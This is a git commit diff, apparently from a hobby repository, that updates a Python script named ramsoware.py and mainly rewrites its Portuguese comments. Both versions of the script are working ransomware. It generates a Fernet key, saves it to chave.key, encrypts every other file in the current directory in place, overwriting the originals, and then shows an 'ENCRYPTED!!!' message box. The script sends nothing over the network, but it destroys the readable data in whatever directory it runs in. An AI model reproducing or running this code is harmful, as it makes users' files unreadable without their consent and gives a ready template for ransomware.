5d8de344f030ee8aa7ca0866d73ebaf08b9cf9f9
Erik Alves <85678826+KiRaz-rmdir@users.noreply.github.com>
2023-03-13 00:12:37 -0300

    Update ramsoware.py

--- ramsoware.py
+++ ramsoware.py
@@ -1,34 +1,33 @@
-import os; ##import biblioteca para automacoes pc
-from cryptography.fernet import Fernet ##importando modulo da bibloteca de criptografia
+import os   # Importação da biblioteca para automação de operações no computador.
+from cryptography.fernet import Fernet   # Importação do módulo de criptografia da biblioteca cryptography.
+from tkinter import messagebox   # Importação do módulo messagebox da biblioteca tkinter para exibição de mensagem ao usuário.
 
-from tkinter import messagebox  
+files = []   # Criação de uma lista para armazenamento dos arquivos a serem criptografados.
+key = Fernet.generate_key()   # Geração de uma chave de criptografia.
 
-
-files = []; ##array de arquivos
-
-key = Fernet.generate_key() ##variavel para armazenar a chave de descriptografia
-
-with open("chave.key","wb") as chave: ##estrutura para escrever a chave para descriptografia 
+# Criação de um arquivo para armazenamento da chave de criptografia gerada.
+with open("chave.key", "wb") as chave:
     chave.write(key)
 
-
-for file in os.listdir(): ##estrutura for para listar os diretorios
-    if file == "ramsoware.py" or file == "chave.key" or file == "codDecrypted.py": ##esrutura de condicao para nn criptografar estes arquivos
+# Laço de repetição para buscar os arquivos a serem criptografados.
+for file in os.listdir():
+    # Verificação para garantir que alguns arquivos específicos não sejam criptografados.
+    if file == "ramsoware.py" or file == "chave.key" or file == "codDecrypted.py":
         continue
-    if os.path.isfile(file): ##estrutura de condicao para listar apenas arquivos
-        files.append(file) ##preencher array files com os arquivos
+    # Verificação para incluir apenas arquivos na lista.
+    if os.path.isfile(file):
+        files.append(file)
 
-for file in files: 
-    with open(file, "rb") as arquivo: ##estrutura para ler todos os arquivos 
-        conteudo = arquivo.read() ## variavel com os arquivos read
-    conteudo_encrypted = Fernet(key).encrypt(conteudo) ##armazenando em var e criptografando todos os arquivos
-    with open(file, "wb") as arquivo: ##estrutura junto com o 'for' para abrir e escrever em todos os arquivos
-        arquivo.write(conteudo_encrypted) ##escrever conteudos na var 'conteudo_encriypted' - que possui todos arquivos criptografados
-        
-messagebox.showinfo("Carregando....","ENCRYPTED!!!")  
+# Laço de repetição para criptografar os arquivos.
+for file in files:
+    # Abertura do arquivo em modo de leitura binária.
+    with open(file, "rb") as arquivo:
+        conteudo = arquivo.read()
+    # Criptografia do conteúdo do arquivo com a chave gerada.
+    conteudo_encrypted = Fernet(key).encrypt(conteudo)
+    # Abertura do arquivo em modo de escrita binária para sobrescrever o arquivo original com o arquivo criptografado.
+    with open(file, "wb") as arquivo:
+        arquivo.write(conteudo_encrypted)
 
-
-
-
-
-
+# Exibição de uma mensagem informando que o processo de criptografia foi concluído.
+messagebox.showinfo("Carregando....","ENCRYPTED!!!")
